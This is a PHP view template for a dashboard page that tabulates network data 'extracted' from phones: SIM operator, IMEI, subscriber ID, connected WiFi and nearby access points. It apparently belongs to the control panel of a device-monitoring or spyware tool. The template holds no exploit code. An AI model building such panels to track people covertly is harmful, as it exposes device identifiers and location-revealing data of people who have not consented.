<?php /** @var array $rows @var int $total @var object $pager @var string $nav_urls */ ?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <div class="d-flex align-items-center flex-wrap">
                        <h1 class="h2 mb-0 mr-3"><i class="fas fa-wifi text-primary mr-2"></i>Network Info</h1>
                        <span class="badge badge-primary border p-2"><i class="fas fa-database mr-1"></i>Total: <b><?= $total ?? 0 ?></b></span>
                    </div>
                    <p class="text-muted mt-1 mb-0">SIM, operator, WiFi and nearby access points</p>
                </div>
                <div class="col-lg-5 text-right"><?= $nav_urls ?></div>


            </div>
        </div>
    </section>
    <section class="content"><div class="container-fluid"><div class="row"><div class="col-12">
        <div class="card card-primary shadow-sm">
            <div class="card-header">
                <h3 class="card-title"><i class="fas fa-network-wired mr-2"></i>Network Snapshots <small class="text-muted ml-2"><?= count($rows) ?> entries</small></h3>
                <div class="card-tools"><button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i></button></div>
            </div>
            <div class="card-body p-0">
                <div class="table-responsive">
                    <table class="table table-hover table-striped mb-0">
                        <thead class="thead-light">
                        <tr>
                            <th><i class="fas fa-signal mr-1"></i>Connection</th>
                            <th><i class="fas fa-sim-card mr-1"></i>SIM / Operator</th>
                            <th><i class="fas fa-id-card mr-1"></i>IMEI / Sub</th>
                            <th><i class="fas fa-wifi mr-1"></i>Connected WiFi</th>
                            <th><i class="fas fa-broadcast-tower mr-1"></i>Nearby APs</th>
                            <th><i class="fas fa-clock mr-1"></i>Extracted</th>
                        </tr>
                        </thead>
                        <tbody>
                        <?php if (empty($rows)): ?>
                            <tr><td colspan="6" class="text-center py-5">
                                <div class="empty-state"><i class="fas fa-wifi fa-3x text-muted mb-3"></i><h4>No network data</h4><p class="text-muted">Data will appear here once extracted</p></div>
                            </td></tr>
                        <?php else: foreach ($rows as $r): ?>
                            <?php $ts = $r['extracted_at'] ? date('Y-m-d H:i', $r['extracted_at'] / 1000) : 'N/A'; ?>
                            <tr>
                                <td>
                                    <span class="badge badge-<?= $r['is_connected'] ? 'success' : 'danger' ?>">
                                        <i class="fas fa-circle mr-1"></i><?= $r['is_connected'] ? 'Online' : 'Offline' ?>
                                    </span>
                                    <div class="mt-1"><span class="badge badge-info"><?= htmlspecialchars($r['connection_type'] ?? '—') ?></span>
                                    <?php if ($r['is_roaming']): ?><span class="badge badge-warning ml-1">Roaming</span><?php endif; ?></div>
                                </td>
                                <td>
                                    <div class="font-weight-bold"><i class="fas fa-building mr-1 text-primary"></i><?= htmlspecialchars($r['sim_operator_name'] ?? '—') ?></div>
                                    <small class="text-muted"><?= strtoupper($r['sim_country_iso'] ?? '') ?> · <?= htmlspecialchars($r['sim_state'] ?? '') ?> · <?= htmlspecialchars($r['phone_type'] ?? '') ?></small>
                                </td>
                                <td>
                                    <div><i class="fas fa-fingerprint mr-1 text-secondary"></i><?= htmlspecialchars($r['device_imei'] ?? '—') ?></div>
                                    <small class="text-muted">Sub: <?= htmlspecialchars($r['subscriber_id'] ?? '—') ?></small>
                                </td>
                                <td>
                                    <?php if ($r['wifi_ssid']): ?>
                                        <div class="font-weight-bold"><i class="fas fa-wifi mr-1 text-success"></i><?= htmlspecialchars($r['wifi_ssid']) ?></div>
                                        <small class="text-muted"><?= htmlspecialchars($r['wifi_bssid'] ?? '') ?> &bull; <?= $r['wifi_rssi'] ?? '' ?> dBm &bull; <?= $r['wifi_frequency'] ?? '' ?> MHz</small>
                                    <?php else: ?><span class="text-muted">—</span><?php endif; ?>
                                </td>
                                <td>
                                    <?php $nearby = $r['nearby_wifi'] ?? []; ?>
                                    <?php if (!empty($nearby)): ?>
                                        <span class="badge badge-secondary"><?= count($nearby) ?> APs</span>
                                        <div class="mt-1">
                                        <?php foreach (array_slice($nearby, 0, 3) as $ap): ?>
                                            <small class="d-block text-muted"><i class="fas fa-broadcast-tower mr-1"></i><?= htmlspecialchars($ap['ssid'] ?? '?') ?> (<?= $ap['level'] ?> dBm)</small>
                                        <?php endforeach; ?>
                                        <?php if (count($nearby) > 3): ?><small class="text-muted">+ <?= count($nearby)-3 ?> more…</small><?php endif; ?>
                                        </div>
                                    <?php else: ?><span class="text-muted">—</span><?php endif; ?>
                                </td>
                                <td><small><?= $ts ?></small></td>
                            </tr>
                        <?php endforeach; endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            <div class="card-footer"><div class="float-right"><?php if (isset($pager)): ?><?= $pager->links('default', 'bootstrap5_full') ?><?php endif; ?></div></div>
        </div>
    </div></div></div></section>
</div>
<?php include __DIR__ . '/_adv_style.php'; ?>
